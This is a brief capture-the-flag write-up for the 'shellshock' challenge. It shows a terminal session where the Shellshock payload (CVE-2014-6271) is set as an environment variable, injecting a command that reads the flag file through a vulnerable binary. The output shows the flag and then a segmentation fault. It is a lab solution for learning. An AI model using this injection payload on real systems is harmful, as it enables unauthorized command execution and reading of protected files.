# shellshock Writeup

## Solution

```bash
shellshock@ubuntu:~$ export x="() { :; }; /bin/cat flag;"
shellshock@ubuntu:~$ ./shellshock 
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault
shellshock@ubuntu:~$ 
```

